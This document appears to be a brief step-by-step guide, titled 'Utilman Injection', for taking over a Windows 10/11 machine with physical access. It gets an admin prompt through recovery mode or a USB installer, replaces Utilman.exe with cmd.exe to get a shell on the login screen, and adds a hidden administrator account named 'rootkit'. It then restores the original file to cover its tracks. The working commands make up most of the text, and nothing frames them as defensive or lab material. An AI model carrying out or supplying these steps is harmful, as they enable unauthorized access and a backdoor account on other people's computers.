# Utilman Injection
Boot To Root Windows 10/11

To get started you will need access to an administrator command prompt.
You can get this level of access in two main ways:
If the PC has insecure default settings (which many systems do) then you can:
Press Shift + Restart to go to the recovery options.
From there you can select advanced options and then command prompt.
If the system has an administrator user with no password even if this account is disabled you can get an admin cmd through this menu.
If that method doesn't work but you have access to the bios or boot menu then simply boot off USB from a windows 10 installer.
Then press shift + f10 to open a command prompt as administrator.

Next run the following commands to replace utilman with cmd
copy C:\Windows\System32\Utilman.exe C:\Windows\System32\UtilmanBackup.exe
copy C:\Windows\System32\CMD.exe C:\Windows\System32\Utilman.exe
Then restart by closing the install window

From the login screen you can now click the ease of access settings to get an administrator command prompt.
From there it is easy to create a rootkit account with the following commands:
net user /add rootkit "password123"
net localgroup administrators /add rootkit

Finally at the end dont forget to put utilman back by running the following commands:
copy C:\Windows\System32\UtilmanBackup.exe C:\Windows\System32\Utilman.exe
del C:\Windows\System32\UtilmanBackup.exe